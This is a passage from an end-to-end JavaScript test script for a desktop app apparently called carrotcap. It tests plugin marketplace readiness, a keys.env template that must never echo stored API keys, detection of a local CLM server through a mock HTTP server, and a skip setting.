      check('official marketplace missing → official entries still "ready", typesafe reports its own marketplace',
        cat.catalog.filter((c) => c.marketplace === 'claude-plugins-official').every((c) => c.marketReady === true)
        && cat.catalog.find((c) => c.id === 'typesafe').marketReady === true, JSON.stringify(cat.catalog.map((c) => [c.id, c.marketReady])));
    } finally {
      fs.renameSync(market + '.away', market);
    }

    console.log('-- task-025: "API 키" button → keys.env');
    const keysFile = process.env.CARROTCAP_KEYS_FILE;
    await ev(`document.querySelector('#keys-open').click(), true`);
    check('the button creates the key file template', await waitFor(async () => fs.existsSync(keysFile), { timeoutMs: 5000 }) && /^TYPESAFE_API_KEY=$/m.test(fs.readFileSync(keysFile, 'utf8')) && /^CLM_API_KEY=$/m.test(fs.readFileSync(keysFile, 'utf8')));
    check('status names the file', /keys\.env/.test(await ev(`document.querySelector('#flow-status').textContent`)));
    fs.writeFileSync(keysFile, 'TYPESAFE_API_KEY=jv_e2e_secret\r\n');
    const reopen = await ev(`window.carrotcap.openKeys()`);
    check('opening again keeps what the user wrote; the reply has the path only, never the key', reopen.ok === true && fs.readFileSync(keysFile, 'utf8').includes('jv_e2e_secret') && !JSON.stringify(reopen).includes('jv_e2e_secret'), JSON.stringify(reopen));
    const st2 = await ev(`window.carrotcap.jevStatus(${JSON.stringify(project)})`);
    check('a key saved in keys.env counts at once (no restart), as a flag only', st2.apiKey === true && !JSON.stringify(st2).includes('jv_e2e_secret'), JSON.stringify(st2));
    fs.writeFileSync(keysFile, '');

    console.log('-- task-025: CLM button with a CLM server running → CLM, no Jev');
    let clmCode = 404; // first: something answers on the port, but it is not a CLM server
    const clmSrv = require('http').createServer((req, res) => { res.writeHead(clmCode, { 'Content-Type': 'application/json' }); res.end(clmCode === 200 ? '{"data":[]}' : '{}'); });
    await new Promise((ok) => clmSrv.listen(clmPort, '127.0.0.1', ok));
    try {
      for (const code of [404, 401, 500]) {
        clmCode = code;
        check(`a ${code} on /v1/models is not a CLM server (up: false)`, (await ev(`window.carrotcap.clmStatus()`)).up === false);
      }
      clmCode = 200;
      check('CLM server reported up (settings URL)', JSON.stringify(await ev(`window.carrotcap.clmStatus()`)) === JSON.stringify({ url: `http://127.0.0.1:${clmPort}`, up: true }));
      await sleep(1000);
      const soCalls = () => calls().filter((l) => /system-one.js/.test(l));
      const nSo = soCalls().length;
      const nJ = jevCalls();
      await ev(`document.querySelector('.btn-flow[data-flow="clm"]').click(), true`);
      check('claude started with the System One rules, without the Jev skill', await waitFor(async () => soCalls().length === nSo + 1, { timeoutMs: 15000 }) && jevCalls() === nJ && !(await modalOpen()), JSON.stringify(soCalls().slice(-1)));
      check('status names CLM and its URL', new RegExp(`CLM http://127\.0\.0\.1:${clmPort}`).test(await ev(`document.querySelector('#flow-status').textContent`)), await ev(`document.querySelector('#flow-status').textContent`));
    } finally {
      clmSrv.close();
    }

    console.log('-- "don\'t ask again" sticks');
    const skip = await ev(`window.carrotcap.skillsSkip(${JSON.stringify(project)})`);
    check('skip recorded, installs kept', skip === true && state().skipped === true && state().installed.includes('frontend-design'));
  } finally {
    await app.close();
    try { fs.rmSync(tmp, { recursive: true, force: true }); } catch { /* shell may hold a file */ }
  }
  console.log('');
  console.log(`Summary: ${pass} passed, ${fail} failed`);
  process.exit(fail === 0 ? 0 : 1);
})().catch((e) => { console.error(e); process.exit(1); });
